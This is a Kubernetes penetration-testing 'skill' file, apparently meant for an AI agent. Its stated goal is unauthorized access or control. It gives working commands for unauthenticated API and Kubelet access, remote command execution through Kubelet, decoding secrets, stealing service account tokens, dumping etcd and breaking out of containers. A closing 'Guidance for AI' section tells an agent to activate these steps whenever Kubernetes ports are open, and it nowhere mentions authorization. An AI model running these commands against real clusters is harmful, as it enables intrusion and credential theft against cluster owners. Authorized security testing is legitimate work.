# Kubernetes Pentesting Skill

## Goal

Identify and exploit vulnerabilities in Kubernetes clusters to gain unauthorized access or control.

## Ports

- **6443** - API Server (HTTPS)
- **10250** - Kubelet API
- **10255** - Kubelet Read-Only
- **2379** - etcd
- **8080** - API Server (insecure)

## Methodology

1. **Identify Kubernetes:** Scan for K8s-related ports
2. **Test API Access:** Check for unauthenticated access
3. **Enumerate Resources:** List namespaces, pods, secrets
4. **Exploit Misconfigs:** Leverage RBAC issues or exposed APIs
5. **Escalate Access:** Break out of container, access cluster

## Enumeration

```bash
# Nmap scan
nmap -sV -p 6443,10250,10255,2379,8080 <target>

# Check API server
curl -k https://<target>:6443/
curl -k https://<target>:6443/api/v1

# Check Kubelet
curl -k https://<target>:10250/pods
curl http://<target>:10255/pods  # Read-only
```

## Unauthenticated API Access

```bash
# Insecure API server (port 8080)
kubectl --server http://<target>:8080 get pods -A
kubectl --server http://<target>:8080 get secrets -A

# Anonymous access to secure API
kubectl --server https://<target>:6443 get pods -A --insecure-skip-tls-verify
```

## Kubelet Exploitation

```bash
# List pods via Kubelet
curl -k https://<target>:10250/pods

# Execute commands in container
curl -k -XPOST "https://<target>:10250/run/<namespace>/<pod>/<container>" -d "cmd=id"

# Get container logs
curl -k https://<target>:10250/containerLogs/<namespace>/<pod>/<container>
```

## Secret Extraction

```bash
# List secrets
kubectl get secrets -A

# View secret content
kubectl get secret <name> -o jsonpath='{.data}'

# Decode base64
kubectl get secret <name> -o jsonpath='{.data.password}' | base64 -d
```

## Service Account Token Abuse

```bash
# Token location in pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use token
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces
```

## etcd Access

```bash
# Connect to etcd
etcdctl --endpoints=http://<target>:2379 get / --prefix

# Get all secrets
etcdctl get /registry/secrets --prefix --keys-only

# Dump secret
etcdctl get /registry/secrets/default/mysecret
```

## Container Breakout

```bash
# Check for privileged container
cat /proc/1/status | grep -i cap

# Mount host filesystem
mount /dev/sda1 /mnt

# Check for sensitive host paths
ls /host-path/
```

## Tools

* **kubectl** - Kubernetes CLI
* **kube-hunter** - Kubernetes vulnerability scanner
* **peirates** - Kubernetes penetration testing tool
* **kubeletctl** - Kubelet exploitation

## Example Commands

```bash
# Scan with kube-hunter
python3 kube-hunter.py --remote <target>

# Kubelet command execution
kubeletctl run "id" --namespace default --pod nginx --container nginx --server <target>
```

## Guidance for AI

* Activate when Kubernetes ports are open (6443, 10250)
* Check for anonymous authentication first
* Kubelet at 10250 often allows pod exec without auth
* Service account tokens enable API access from pods
* etcd contains all cluster secrets unencrypted
* Privileged containers are easy escape vectors
